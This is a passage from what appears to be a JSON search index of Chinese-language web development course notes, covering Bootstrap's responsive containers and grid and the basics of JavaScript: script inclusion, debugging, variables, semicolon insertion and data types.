\u6846\u67b6\u65e8\u5728\u514b\u670d\u8fd9\u4e9b\u9650\u5236\u3002\u5b83\u4eec\u7684\u4e3b\u8981\u4f18\u52bf\u4e4b\u4e00\u662f\u901a\u5e38\u88ab\u8bbe\u8ba1\u4e3a\u54cd\u5e94\u5f0f\u7684\uff0c\u56e0\u6b64\u4e00\u4e2a\u5e94\u7528\u5728\u79fb\u52a8\u8bbe\u5907\u3001\u5e73\u677f\u7535\u8111\u548c\u4e2a\u4eba\u7535\u8111\u4e0a\u770b\u8d77\u6765\u90fd\u4e0d\u9519\uff0c\u4e14\u53ea\u9700\u5f88\u5c11\u7684\u52aa\u529b\u3002</li> <li>\u6846\u67b6\u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u4f7f\u7528\u76f8\u540c\u6846\u67b6\u6784\u5efa\u7684\u7f51\u7ad9\u901a\u5e38\u770b\u8d77\u6765\u89c6\u89c9\u4e0a\u5f88\u76f8\u4f3c\u3002</li> </ul>"},{"location":"cs/mern/3403/l4/#what-is-meant-by-a-responsive-design","title":"What is meant by a \u201cresponsive design\u201d","text":"<ul> <li>Responsive design \u662f\u6307\u80fd\u591f\u6539\u53d8\u98ce\u683c\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u8bbe\u5907\uff0c\u4f8b\u5982\u624b\u673a\u3001\u5e73\u677f\u7535\u8111\u548c\u4e2a\u4eba\u7535\u8111\u3002</li> </ul> <ul> <li>CSS \u6846\u67b6\uff08\u5982 Bootstrap\uff09\u65e8\u5728\u8f7b\u677e\u5b9e\u73b0\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u3002</li> </ul> <ul> <li>\u4e3a\u4e86\u652f\u6301\u54cd\u5e94\u5f0f\u8bbe\u8ba1\uff0c\u9700\u8981\u5305\u542b\u4e00\u4e2a\u8bbe\u7f6e\u89c6\u53e3\u5bbd\u5ea6\u4e3a\u8bbe\u5907\u5bbd\u5ea6\u7684 meta-tag\uff0c\u4ee5\u4fbf\u4e8e\u7f29\u653e\u3002</li> </ul> <ul> <li>\u6846\u67b6\u63d0\u4f9b\u4e86\u54cd\u5e94\u5f0f\u5e03\u5c40\u673a\u5236\uff1a</li> </ul> <ul> <li>Containers: \u6846\u67b6\u63d0\u4f9b\u5bb9\u5668\u7c7b\u6765\u8bbe\u7f6e\u9875\u9762\u7684\u4e3b\u8981\u5e03\u5c40\u3002\u4f8b\u5982\uff0c<code>.container</code> \u7c7b\u4f1a\u81ea\u52a8\u8bbe\u7f6e\u54cd\u5e94\u9875\u9762\u5927\u5c0f\u7684\u8fb9\u8ddd\u3002<code>.container</code> \u662f\u4e00\u79cd\u54cd\u5e94\u5f0f\u7684\u56fa\u5b9a\u5bbd\u5ea6\u5bb9\u5668\uff0c\u5176\u6700\u5927\u5bbd\u5ea6\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u65ad\u70b9\uff08xs, sm, md, lg, xl, xxl\uff09\u8c03\u6574\u3002\u5b83\u4f1a\u4f7f\u5185\u5bb9\u5c45\u4e2d\u5e76\u6839\u636e\u8bbe\u5907\u7684\u5c4f\u5e55\u5c3a\u5bf8\u8fdb\u884c\u8c03\u6574\u3002<code>.container-fluid</code> \u662f\u4e00\u4e2a\u5168\u5bbd\u5bb9\u5668\uff0c\u59cb\u7ec8\u8de8\u8d8a\u89c6\u53e3\u7684 100%\u3002<code>.container-{breakpoint}</code> \u7c7b\uff08\u4f8b\u5982 <code>.container-sm</code>, <code>.container-md</code>\uff09\u5728\u8fbe\u5230\u6307\u5b9a\u65ad\u70b9\u4e4b\u524d\u662f\u6d41\u5f0f\uff08\u5168\u5bbd\uff09\u7684\uff0c\u8fbe\u5230\u65ad\u70b9\u540e\u5219\u8868\u73b0\u4e3a\u56fa\u5b9a\u5bbd\u5ea6\u5bb9\u5668\u3002</li> </ul> <ul> <li> <p>Grid System</p> <p>Bootstrap \u7684\u7f51\u683c\u7cfb\u7edf\u4f7f\u7528\u4e00\u7cfb\u5217\u5bb9\u5668\u3001\u884c\u548c\u5217\u6765\u5e03\u5c40\u548c\u5bf9\u9f50\u5185\u5bb9\u3002\u5b83\u4f7f\u7528 12 \u5217\u7684\u884c\u8fdb\u884c\u5e03\u5c40\u3002</p> <ul> <li>\u6bcf\u4e2a\u7ec4\u4ef6\uff08\u6216 div\uff09\u53ef\u4ee5\u6307\u5b9a\u8de8\u8d8a\u8fd9\u4e9b\u5217\u4e2d\u7684\u4e00\u5b9a\u6570\u91cf\u3002</li> <li>\u5e03\u5c40\u53ef\u4ee5\u6839\u636e\u8bbe\u5907\u5c3a\u5bf8\uff08extra small, small, medium and large\uff09\u6765\u6307\u5b9a\u3002</li> <li><code>col</code> \u7c7b\u53ef\u4ee5\u5728\u6240\u6709\u8bbe\u5907\u548c\u89c6\u53e3\u4e0a\u521b\u5efa\u7b49\u5bbd\u5217\u3002</li> <li>\u53ef\u4ee5\u901a\u8fc7\u7c7b\uff08\u5982 <code>col-6</code>\uff09\u6307\u5b9a\u5217\u5360\u636e\u7684\u5207\u7247\u6570\u91cf\u3002<code>col-6</code> \u5c06\u5143\u7d20\u5206\u914d\u4e3a\u8de8\u8d8a 12 \u5217\u4e2d\u7684 6 \u5217\uff0c\u5373\u6b63\u597d\u662f\u884c\u5bbd\u5ea6\u7684\u4e00\u534a\u3002<code>col-4</code> \u548c <code>col-8</code> \u53ef\u4ee5\u5b9e\u73b0\u975e\u5bf9\u79f0\u5e03\u5c40\u3002</li> <li>\u53ef\u4ee5\u6307\u5b9a\u4e0d\u540c\u8bbe\u5907\u7684\u5e03\u5c40\u3002\u4f8b\u5982\uff0c<code>col-md-6</code> \u6307\u5b9a\u5728\u4e2d\u7b49\u53ca\u66f4\u5927\u5c3a\u5bf8\u8bbe\u5907\u4e0a\uff0c\u6bcf\u5217\u5c06\u5360\u636e\u884c\u5bbd\u7684 50%\uff0c\u4ece\u800c\u5f62\u6210\u4e24\u5217\u5e03\u5c40\u3002\u7ed3\u5408\u4f7f\u7528\u7c7b\uff08\u5982 <code>col-sm-6</code> \u548c <code>col-lg-3</code>\uff09\u53ef\u4ee5\u4e3a\u4e0d\u540c\u8bbe\u5907\u6307\u5b9a\u4e0d\u540c\u5e03\u5c40\u3002</li> </ul> </li> </ul> <p>\u60a8\u5c06\u4e0d\u4f1a\u88ab\u8981\u6c42\u9605\u8bfb\u3001\u7f16\u5199\u6216\u4fee\u590d Bootstrap \u4ee3\u7801\u3002\u8003\u8bd5\u5c06\u66f4\u4fa7\u91cd\u4e8e\u6982\u5ff5\u6027\u7684\u7406\u89e3\uff0c\u4f8b\u5982 CSS \u6846\u67b6\u7684\u76ee\u7684\u548c\u54cd\u5e94\u5f0f\u8bbe\u8ba1\u7684\u542b\u4e49\u3002</p>"},{"location":"cs/mern/3403/l5/","title":"5.0 Core JavaScript","text":""},{"location":"cs/mern/3403/l5/#1","title":"1. \u7b80\u4ecb","text":""},{"location":"cs/mern/3403/l5/#11-javascript","title":"1.1 \u4ec0\u4e48\u662f JavaScript\uff1f","text":"<p>\u4e00\u79cd\u9ad8\u7ea7\u7684 high-level\u3001\u52a8\u6001\u7684 dynamic\u3001\u65e0\u7c7b\u578b\u7684 untyped \u548c\u89e3\u91ca\u578b interpreted \u7684\u7f16\u7a0b\u8bed\u8a00\u3002</p> <p>\u5b83\u5df2\u5728 ECMAScript \u8bed\u8a00\u89c4\u8303\u4e2d\u6807\u51c6\u5316\u3002</p> <p>\u4e0e HTML \u548c CSS \u4e00\u8d77\uff0c\u5b83\u662f\u4e07\u7ef4\u7f51 World Wide Web \u5185\u5bb9\u751f\u4ea7\u7684\u4e09\u5927\u57fa\u672c\u6280\u672f\u4e4b\u4e00\u3002HTML \u5b9a\u4e49\u4e86\u7f51\u9875\u7684\u7ed3\u6784 skeleton\uff0cCSS \u5904\u7406\u8868\u793a (\u5916\u89c2)\uff0c\u800c JavaScript \u589e\u52a0\u4e86\u52a8\u6001\u6027\u548c\u4ea4\u4e92\u6027\u3002</p> <p>\u5b83\u662f\u57fa\u4e8e prototype-based \u7684\uff0c\u5177\u6709 first-class functions\uff0c\u4f7f\u5176\u6210\u4e3a\u4e00\u79cd\u591a\u8303\u5f0f\u8bed\u8a00\uff0c\u652f\u6301 object-oriented\u3001imperative \u548c functional \u7f16\u7a0b\u98ce\u683c\u3002\u5b83\u7684\u8bbe\u8ba1\u521d\u8877\u662f\u6613\u4e8e\u5feb\u901f\u7f16\u5199\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5b83\u4e0e Java \u6beb\u65e0\u5173\u7cfb\uff1b\u8fd9\u4e2a\u540d\u5b57\u662f\u5728 Java \u6d41\u884c\u65f6\u7684\u4e00\u4e2a\u8425\u9500\u51b3\u7b56\u3002</p>"},{"location":"cs/mern/3403/l5/#12","title":"1.2 \u7ec4\u6210\u90e8\u5206","text":"<p>\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u4e3b\u8981\u7ec4\u6210\u90e8\u5206\uff1a</p> <ul> <li>Core JavaScript\uff1a\u8bed\u8a00\u7684\u57fa\u7840\uff0c\u5904\u7406\u6570\u636e\u64cd\u4f5c\u548c\u663e\u793a\u3002\u8fd9\u662f\u672c\u6307\u5357\u7684\u91cd\u70b9\u3002</li> <li>Client-side JavaScript\uff1a\u6d89\u53ca\u652f\u6301\u6d4f\u89c8\u5668\u63a7\u5236\u548c\u7528\u6237\u4ea4\u4e92\u7684\u5bf9\u8c61\uff0c\u5141\u8bb8\u52a8\u6001\u4fee\u6539\u7f51\u9875\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u7528\u6237\u8f93\u5165\u66f4\u6539\u6587\u672c\u6216\u4f7f\u56fe\u7247\u51fa\u73b0/\u6d88\u5931\u3002</li> <li>Server-side JavaScript\uff1a\u5305\u542b\u652f\u6301\u5728 Web \u670d\u52a1\u5668\u4e0a\u4f7f\u7528\u7684\u5bf9\u8c61\u3002\u50cf NodeJS \u8fd9\u6837\u7684\u73af\u5883\u5141\u8bb8\u5728\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#13","title":"1.3 \u5728\u524d\u7aef\u7684\u7528\u9014","text":"<p>\u4e3b\u8981\u7528\u4e8e\u524d\u7aef\u4ee5\u5b9e\u73b0\uff1a</p> <ul> <li>\u51cf\u5c11 Server Load\uff1a\u901a\u8fc7\u5c06\u8ba1\u7b97\u63a8\u9001\u5230\u5ba2\u6237\u7aef\u7684\u6d4f\u89c8\u5668\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u5904\u7406\u66f4\u591a\u7528\u6237\u5e76\u66f4\u597d\u5730\u6269\u5c55\u3002</li> <li>\u63d0\u9ad8 Responsiveness\uff1a\u4e0e\u5c06\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u5e76\u7b49\u5f85\u54cd\u5e94\u76f8\u6bd4\uff0c\u5ba2\u6237\u7aef\u5904\u7406\u63d0\u4f9b\u4e86\u66f4\u5feb\u7684\u53cd\u5e94\u65f6\u95f4\u3002</li> <li>Form Handling \u548c Validation\uff1a\u53ef\u4ee5\u5904\u7406\u8868\u5355\u5e76\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u4e2d\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u3002\u6ce8\u610f\uff1a\u5173\u952e\u7684\u9a8c\u8bc1 \u5fc5\u987b \u540c\u65f6\u5728\u670d\u52a1\u5668\u7aef\u8fdb\u884c\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u63a7\u4ef6\u5f88\u5bb9\u6613\u88ab\u7ed5\u8fc7\u3002\u5ba2\u6237\u7aef\u9a8c\u8bc1\u662f\u4e3a\u4e86\u7528\u6237\u4f53\u9a8c\u548c\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\u5668\u8bf7\u6c42\uff0c\u800c\u4e0d\u662f\u4e3a\u4e86\u5b89\u5168\u3002</li> <li>Dynamic Page Alteration\uff1a\u53ef\u4ee5\u4e0e\u7f51\u9875\u7684\u5185\u90e8\u6a21\u578b\uff08\u6587\u6863\u5bf9\u8c61\u6a21\u578b - DOM\uff09\u4ea4\u4e92\uff0c\u4ee5\u52a8\u6001\u66f4\u6539\u5176\u5185\u5bb9\u548c\u7ed3\u6784\u3002</li> <li>Complex User Interfaces\uff1a\u5b83\u80fd\u591f\u521b\u5efa\u6bd4\u5355\u72ec\u4f7f\u7528 HTML \u548c CSS \u6240\u80fd\u63d0\u4f9b\u7684\u66f4\u590d\u6742\u7684\u7528\u6237\u754c\u9762\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#14-event-driven-computation","title":"1.4 Event-driven Computation","text":"<p>\u8bb8\u591a\u7a0b\u5e8f\u65e8\u5728\u54cd\u5e94\u7528\u6237\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u79f0\u4e3a events\uff0c\u4f8b\u5982\u9f20\u6807\u70b9\u51fb\u6216\u6309\u952e\u3002</p> <p>\u4e3b\u8981\u4efb\u52a1\u901a\u5e38\u662f\u54cd\u5e94\u8fd9\u4e9b events \u5e76\u89e6\u53d1\u76f8\u5e94\u7684\u64cd\u4f5c\u3002</p> <p>\u793a\u4f8b\uff1aHTML \u6309\u94ae\u4e2d\u7684 onclick \u5c5e\u6027\u53ef\u4ee5\u5728\u6309\u94ae\u88ab\u70b9\u51fb\u65f6\u6267\u884c\u4ee3\u7801\u3002</p> <pre><code>&lt;html&gt;&lt;body&gt;&lt;p&gt; Web \u5f00\u53d1\u8005\u7684\u72d7\u8bf4\u4e86\u4ec0\u4e48\uff1f&lt;/p&gt;&lt;button onclick=\"getElementById('demo').innerHTML='Href href!'\"&gt; \u544a\u8bc9\u6211\uff01&lt;/button&gt;&lt;p id=\"demo\"&gt;&lt;p/&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u5355\u51fb \"\u544a\u8bc9\u6211\uff01\" \u6309\u94ae\u4f1a\u66f4\u6539 ID \u4e3a \"demo\" \u7684\u6bb5\u843d\u5185\u5bb9\u3002</p>"},{"location":"cs/mern/3403/l5/#2","title":"2. \u6267\u884c\u548c\u5305\u542b","text":""},{"location":"cs/mern/3403/l5/#21-execution-environments","title":"2.1 Execution Environments","text":"<p>\u8fd0\u884c\u6709\u4e24\u4e2a\u4e3b\u8981\u73af\u5883\uff1a</p> <ul> <li>The Browser\uff1a\u6bcf\u4e2a\u73b0\u4ee3 Web \u6d4f\u89c8\u5668\u90fd\u53ef\u4ee5\u6267\u884c\u3002\u8bb8\u591a\u51fd\u6570\u65e8\u5728\u5728 HTML \u5bb9\u5668\u6216\u7a97\u53e3\u4e2d\u5de5\u4f5c\u3002</li> <li>NodeJS\uff1a\u4e00\u4e2a\u670d\u52a1\u5668\u7aef\u73af\u5883\u3002</li> </ul> <p>\u672c\u6307\u5357\u5c06\u4e3b\u8981\u5173\u6ce8\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002</p>"},{"location":"cs/mern/3403/l5/#22","title":"2.2 \u5728\u7f51\u9875\u4e2d\u5305\u542b","text":"<p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06\u4ee3\u7801\u5305\u542b\u5728 HTML \u9875\u9762\u4e2d\uff1a</p> <ul> <li>Inline in a tag attribute\uff1a\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 HTML \u6807\u7b7e\u7684\u5c5e\u6027\u4e2d\uff0c\u4f8b\u5982 <code>onclick</code>\u3002</li> </ul> <ul> <li>\u5728\u6587\u6863\u4e3b\u4f53\u4e2d\u4f7f\u7528 <code>&lt;script&gt;</code> \u6807\u7b7e\uff1a\u4ee3\u7801\u53ef\u4ee5\u5d4c\u5165\u5728 <code>&lt;script&gt;</code> \u6807\u7b7e\u5185\uff0c\u901a\u5e38\u653e\u5728 HTML \u6587\u6863\u7684 <code>&lt;head&gt;</code> \u6216 <code>&lt;body&gt;</code> \u4e2d\u3002</li> </ul> <pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;function myFunction() {\n    document.getElementById(\"demo\").innerHTML = \"\u6bb5\u843d\u5df2\u66f4\u6539\u3002\";\n}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;\u4e00\u4e2a\u7f51\u9875&lt;/h1&gt;&lt;p id=\"demo\"&gt;\u4e00\u4e2a\u6bb5\u843d&lt;/p&gt;&lt;button type=\"button\" onclick=\"myFunction()\"&gt;\u8bd5\u8bd5\u770b&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c<code>myFunction</code> \u5728 <code>&lt;head&gt;</code> \u4e2d\u5b9a\u4e49\uff0c\u5e76\u7531\u6309\u94ae\u7684 <code>onclick</code> \u4e8b\u4ef6\u8c03\u7528\u3002</p> <ul> <li>From an external file\uff1a\u4ee3\u7801\u53ef\u4ee5\u5b58\u50a8\u5728\u4e00\u4e2a\u5355\u72ec\u7684 <code>.js</code> \u6587\u4ef6\u4e2d\uff0c\u5e76\u4f7f\u7528 <code>&lt;script&gt;</code> \u6807\u7b7e\u7684 <code>src</code> \u5c5e\u6027\u8fdb\u884c\u94fe\u63a5\u3002\u8fd9\u662f\u7ec4\u7ec7\u4ee3\u7801\u548c\u4f7f\u7528\u5916\u90e8\u5e93\u7684\u5e38\u89c1\u505a\u6cd5\u3002</li> </ul> <p>\u51fd\u6570\u901a\u5e38\u5e94\u5728\u4f7f\u7528\u524d\u5b9a\u4e49\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u811a\u672c\u901a\u5e38\u653e\u5728 <code>&lt;head&gt;</code> \u4e2d\u6216\u4ece\u5916\u90e8\u94fe\u63a5\u7684\u539f\u56e0\u3002</p>"},{"location":"cs/mern/3403/l5/#23","title":"2.3 \u5728\u6d4f\u89c8\u5668\u4e2d\u8c03\u8bd5","text":"<p>\u9519\u8bef\u901a\u5e38\u7531\u6d4f\u89c8\u5668\u68c0\u6d4b\u548c\u5904\u7406\u3002</p> <p>\u50cf Chrome \u8fd9\u6837\u7684\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86 developer tools\uff0c\u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>Console\uff1a\u5141\u8bb8\u4f60\u4e0e\u4ee3\u7801\u548c\u9875\u9762\u4ea4\u4e92\uff0c\u67e5\u770b\u65e5\u5fd7\u6d88\u606f (<code>console.log</code>)\uff0c\u5e76\u67e5\u770b\u9519\u8bef\u6d88\u606f\u3002\u9519\u8bef\u901a\u5e38\u5728\u7f51\u9875\u672c\u8eab\u4e0a\u88ab\u9759\u9ed8\u5904\u7406\uff0c\u4f46\u4f1a\u663e\u793a\u5728\u63a7\u5236\u53f0\u4e2d\u3002</li> <li>Sources Tab\uff1a\u5141\u8bb8\u4f60\u6d4f\u89c8\u4ee3\u7801 (HTML, CSS, JavaScript)\u3002</li> <li>Breakpoints \u548c Debugger\uff1a\u5141\u8bb8\u4f60\u5728\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5355\u6b65\u6267\u884c\uff0c\u5e76\u68c0\u67e5\u53d8\u91cf\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#24-io","title":"2.4 \u6d4f\u89c8\u5668\u4e2d\u7684\u8f93\u5165/\u8f93\u51fa (I/O)","text":"<p>\u5728\u6d4f\u89c8\u5668\u4e2d\uff0c\u4e3b\u8981\u8f93\u51fa\u662f\u7f51\u9875\uff08HTML canvas\uff09\u672c\u8eab\uff1b\u7ed3\u679c\u901a\u5e38\u901a\u8fc7\u4fee\u6539\u9875\u9762\u5185\u5bb9\u6765\u663e\u793a\u3002</p> <ul> <li><code>console.log()</code>\uff1a\u7528\u4e8e\u901a\u8fc7\u5411\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u5199\u5165\u6d88\u606f\u6765\u8fdb\u884c\u7b80\u5355\u8c03\u8bd5\u3002\u73b0\u5728\u8ba4\u4e3a\u5c06\u5927\u91cf\u65e5\u5fd7\u6216\u9519\u8bef\u6d88\u606f\u76f4\u63a5\u5199\u5165 document object \u662f\u4e0d\u597d\u7684\u505a\u6cd5\u3002</li> <li><code>alert()</code>\uff1a\u5411\u7528\u6237\u663e\u793a\u4e00\u4e2a\u7b80\u5355\u7684\u5f39\u51fa\u6d88\u606f\u6846\u3002</li> <li><code>confirm()</code>\uff1a\u663e\u793a\u4e00\u4e2a\u5e26\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u6309\u94ae\u7684\u5f39\u51fa\u6846\uff0c\u5141\u8bb8\u7528\u6237\u8fdb\u884c\u5e03\u5c14\u54cd\u5e94\u3002</li> <li><code>prompt()</code>\uff1a\u663e\u793a\u4e00\u4e2a\u63d0\u793a\u7528\u6237\u8f93\u5165\u7684\u5f39\u51fa\u6846\u3002</li> </ul> <p>\u8fd9\u4e9b I/O \u65b9\u6cd5\uff08<code>alert</code>\u3001<code>confirm</code>\u3001<code>prompt</code>\uff09\u901a\u5e38\u7528\u4e8e\u5feb\u901f\u539f\u578b\u5236\u4f5c\uff0c\u800c\u4e0d\u662f\u7528\u4e8e\u6700\u7ec8\u7684\u751f\u4ea7\u7f51\u7ad9\uff0c\u5728\u751f\u4ea7\u7f51\u7ad9\u4e2d\uff0c\u66f4\u503e\u5411\u4e8e\u4f7f\u7528\u8868\u5355\u548c\u6309\u94ae\u7b49 HTML \u5143\u7d20\u8fdb\u884c\u7528\u6237\u4ea4\u4e92\u3002</p>"},{"location":"cs/mern/3403/l5/#3-core-javascript","title":"3. Core JavaScript \u57fa\u7840","text":"<p>\u672c\u8282\u5bf9 Core JavaScript \u8fdb\u884c\u201c\u65cb\u98ce\u5f0f\u6e38\u89c8\u201d\uff0c\u91cd\u70b9\u4ecb\u7ecd\u5176\u7279\u6027\u4ee5\u53ca\u4e0e Python \u548c Java \u7b49\u8bed\u8a00\u7684\u5dee\u5f02\u3002</p>"},{"location":"cs/mern/3403/l5/#31-variables","title":"3.1 Variables","text":"<ul> <li>Naming Rules\uff1a\u5fc5\u987b\u4ee5\u5b57\u6bcd\u3001\u7f8e\u5143\u7b26\u53f7 ($) \u6216\u4e0b\u5212\u7ebf (_) \u5f00\u5934\u3002\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7f8e\u5143\u7b26\u53f7\u6216\u4e0b\u5212\u7ebf\u3002</li> </ul> <ul> <li>Case-sensitive\u3002</li> </ul> <ul> <li>\u4e60\u60ef\u4e0a\u4f7f\u7528 camelCase \u4e66\u5199\uff08\u4f8b\u5982\uff0c<code>myVariableName</code>\uff09\uff0c\u8fd9\u4e0d\u540c\u4e8e Python \u7684 snake_case\uff0c\u4f46\u4e0e Java \u7684\u7ea6\u5b9a\u7c7b\u4f3c\u3002</li> </ul> <ul> <li>Assignment\uff1a\u4f7f\u7528\u6807\u51c6\u7684\u7b49\u53f7 (=) \u7b26\u53f7\u3002</li> </ul> <ul> <li>Declaration Keywords\uff1a\u63d0\u4f9b\u4e86\u56db\u79cd\u58f0\u660e\u53d8\u91cf\u7684\u65b9\u5f0f\uff1a</li> </ul> <ul> <li><code>let</code>\uff1a\u63a8\u8350\u7684\u9ed8\u8ba4\u5173\u952e\u5b57\u3002</li> <li><code>const</code>\uff1a\u7528\u4e8e\u503c\u4e0d\u80fd\u88ab\u91cd\u65b0\u8d4b\u503c\u7684\u5e38\u91cf\u3002</li> <li><code>var</code>\uff1a\u5177\u6709\u4e0d\u540c\u4f5c\u7528\u57df\u89c4\u5219\u7684\u65e7\u5173\u952e\u5b57\u3002</li> <li>\u65e0\u5173\u952e\u5b57 Undeclared\uff1a\u521b\u5efa global variable\uff1b\u901a\u5e38\u4e0d\u9f13\u52b1\u3002</li> </ul> <pre><code>let z = x + y;\nconst x = 6;\nvar stopFlag = true;\nzz = z; // \u672a\u58f0\u660e (\u6210\u4e3a\u5168\u5c40\u53d8\u91cf)\n</code></pre> <ul> <li>Multiple Declarations\uff1a\u53ef\u4ee5\u5728\u540c\u4e00\u884c\u58f0\u660e\u591a\u4e2a\u53d8\u91cf\u3002</li> </ul> <pre><code>let counter, index, pi = 3.14159265, rover = \"Palmer\";\n</code></pre> <p>\uff08\u6807\u51c6\u7684\u884c\u4e3a\u662f\u53ea\u6709 <code>pi</code> \u4f1a\u88ab\u521d\u59cb\u5316\u4e3a 3.14159265\uff1b<code>counter</code> \u548c <code>index</code> \u5c06\u662f undefined\u3002\uff09</p>"},{"location":"cs/mern/3403/l5/#32-keywords","title":"3.2 Keywords","text":"<p>\u67d0\u4e9b\u8bcd\u662f\u4fdd\u7559\u7684\uff0c\u4e0d\u80fd\u7528\u4f5c\u53d8\u91cf\u540d\u3002</p>"},{"location":"cs/mern/3403/l5/#33-syntax-error-tolerance","title":"3.3 Syntax \u548c Error Tolerance","text":"<ul> <li>Comments\uff1a</li> </ul> <ul> <li>\u5355\u884c\u6ce8\u91ca\uff1a<code>//</code></li> <li>\u591a\u884c\u6ce8\u91ca\uff1a<code>/* ... */</code></li> </ul> <ul> <li>Semicolons - ;\uff1a\u8bed\u53e5 \u5e94\u8be5 \u4ee5\u5206\u53f7\u7ed3\u675f\u3002</li> </ul> <p>\u7136\u800c\uff0c\u5982\u679c\u5206\u53f7\u7f3a\u5931\u4e14\u8bed\u53e5\u770b\u8d77\u6765\u5b8c\u6574\uff0c\u89e3\u91ca\u5668\u4f1a\u5c1d\u8bd5\u81ea\u52a8\u63d2\u5165\u5206\u53f7\uff08\u81ea\u52a8\u5206\u53f7\u63d2\u5165 - ASI\uff09\u3002</p> <ul> <li>Banana Skin\uff1aASI \u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u884c\u4e3a\u548c\u9519\u8bef\uff0c\u4f7f\u8c03\u8bd5\u53d8\u5f97\u56f0\u96be\u3002\u4f8b\u5982\uff1a</li> </ul> <pre><code>return  // ASI \u5728\u6b64\u63d2\u5165\u5206\u53f7\uff1areturn;\nx;      // \u8fd9\u53d8\u6210\u4e86\u4e00\u6761\u4e0d\u53ef\u8fbe\u7684\u8bed\u53e5\uff1ax;\n</code></pre> <p>\u8fd9\u5b9e\u9645\u4e0a\u4f1a\u8fd4\u56de undefined \u800c\u4e0d\u662f <code>x</code>\u3002</p> <ul> <li>Error Handling Philosophy\uff1a\u88ab\u8bbe\u8ba1\u6210\u975e\u5e38\u201c\u5065\u58ee\u201d\u4e14\u80fd\u5bb9\u5fcd\u9519\u8bef\u3002\u5b83\u901a\u5e38\u4f1a\u5c1d\u8bd5\u201c\u731c\u6d4b\u201d\u7a0b\u5e8f\u5458\u7684\u610f\u56fe\u5e76\u7ee7\u7eed\u6267\u884c\uff0c\u800c\u4e0d\u662f\u505c\u6b62\u3002\u8fd9\u53ef\u80fd\u4f7f\u8c03\u8bd5\u5177\u6709\u6311\u6218\u6027\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#34-primitives-objects","title":"3.4 Primitives \u548c Objects","text":"<p>\u533a\u5206\u539f\u59cb\u6570\u636e\u7c7b\u578b\u548c\u5bf9\u8c61\uff1a</p> <ul> <li>Primitive Data Types\uff1a\u8fd9\u4e9b\u662f\u76f4\u63a5\u5b58\u50a8\u7684\u4e0d\u53ef\u53d8\u503c\uff08\u901a\u5e38\u5728 stack \u4e0a\uff09\u3002\u4e3b\u8981\u7684 primitives \u662f\uff1a</li> </ul> <ul> <li><code>Number</code></li> </ul> <ul> <li><code>String</code></li> </ul> <ul> <li><code>Boolean</code></li> </ul> <ul> <li><code>null</code></li> </ul> <ul> <li> <p>undefined</p> <p>\uff08ES6 \u5f15\u5165\u4e86 Symbol\uff0c\u540e\u6765\u53c8\u6dfb\u52a0\u4e86 BigInt\u3002\uff09</p> </li> </ul> <ul> <li>Objects\uff1a\u5982\u679c\u4e00\u4e2a\u503c\u4e0d\u662f primitive\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a object\u3002\u8fd9\u5305\u62ec\uff1a</li> </ul> <ul> <li><code>Function</code></li> </ul> <ul> <li><code>Array</code></li> </ul> <ul> <li><code>Date</code></li> </ul> <ul> <li> <p>Math \u7b49\u3002</p> <p>Objects \u4f5c\u4e3a\u5bf9\u5185\u5b58\uff08heap\uff09\u4e2d\u5b58\u50a8\u5176\u5c5e\u6027\u7684\u4f4d\u7f6e\u7684 reference \u6216 pointer \u5b58\u50a8\u3002</p> </li> </ul> <ul> <li>Object Properties\uff1a\u4f7f\u7528\u70b9 (.) \u8bed\u6cd5\u8bbf\u95ee\uff08\u4f8b\u5982\uff0c<code>\"abc\".length</code>\uff0c<code>Math.sin(...)</code>\uff09\u3002</li> </ul> <ul> <li>Garbage Collection\uff1a\u81ea\u52a8\u7ba1\u7406\u5185\u5b58\u3002\u5f53\u4e0d\u518d\u6709\u5bf9 objects \u7684\u5f15\u7528\u65f6\uff0c\u5b83\u4eec\u4f1a\u88ab\u5783\u573e\u56de\u6536\u3002</li> </ul>"},{"location":"cs/mern/3403/l5/#35","title":"3.5 \u6570\u636e\u7c7b\u578b\u8be6\u89e3","text":""},{"location":"cs/mern/3403/l5/#351-numbers","title":"3.5.1 Numbers","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 <code>Number</code> \u503c\u90fd\u8868\u793a\u4e3a\u53cc\u7cbe\u5ea6 64 